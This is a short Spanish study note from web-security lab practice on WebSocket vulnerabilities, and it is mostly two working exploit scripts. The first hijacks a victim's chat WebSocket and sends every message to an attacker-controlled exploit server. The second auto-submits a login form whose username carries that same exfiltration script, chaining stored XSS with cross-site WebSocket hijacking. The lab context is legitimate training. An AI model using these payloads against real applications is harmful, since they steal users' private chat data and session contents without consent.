# WEBSOCKET

> Labs → [[vulnerabilities/012-websockets/labs/README|labs]] · Ejemplos: [[vulnerabilities/012-websockets/examples/001-manipular-mensaje-xss|001 · mensaje XSS]] · [[vulnerabilities/012-websockets/examples/002-handshake-ip-spoof-filtro|002 · handshake IP spoof]] · [[vulnerabilities/012-websockets/examples/003-cross-site-websocket-hijacking|003 · CSWSH]]

> [!note] PoCs de CSWSH (abajo)
> El primer `<script>` es el CSWSH básico (abre WS → `READY` → exfil a tu exploit server). El segundo es la variante **encadenada**: fuerza el login de la víctima con un `username` que lleva el JS de exfil (stored XSS + CSWSH). Reemplazá `url`, `attackerServer` y los LAB-ID.

<script>
const url = "wss://0ad8004b04f1105b80902bb500d3003d.web-security-academy.net/chat" 
const attackerServer = "https://exploit-0a3c00fd0310b6a9806a218c01bb0058.exploit-server.net/logs"

const newWebSocket = new WebSocket(url);

newWebSocket.onopen = function (evt) { 
	newWebSocket.send("READY");
} 

newWebSocket.onmessage = function (evt) {
	var message = evt.data;
	console.log(message);
	fetch(attackerServer+message);
}; 

newWebSocket.onclose = function (evt) { 
	webSocket = undefined; writeMessage("message", "System:", "--- Disconnected ---"); 
};
</script>


<script>
document.addEventListener("DOMContentLoaded", () => {

const url = "https://cms-0a1e00ff039eb691801b224100e40079.web-security-academy.net"

const script = `
const url = "wss://0a1e00ff039eb691801b224100e40079.web-security-academy.net/chat" 
const attackerServer = "https://exploit-0a3c00fd0310b6a9806a218c01bb0058.exploit-server.net/logs"

const newWebSocket = new WebSocket(url);

newWebSocket.onopen = function (evt) { 
	newWebSocket.send("READY");
} 

newWebSocket.onmessage = function (evt) {
	var message = evt.data;
	fetch(attackerServer+message);
}; 
`

const form = document.createElement("form");
form.method = "POST";
form.action = `${url}/login`;

const input = document.createElement("input");
input.type = "text";
input.name = "username";
input.value = script ;
form.appendChild(input);

const input2 = document.createElement("input");
input2 .type = "text";
input2 .name = "password";
input2 .value = "Test";
form.appendChild(input2);

document.body.appendChild(form);
form.submit();
});
</script>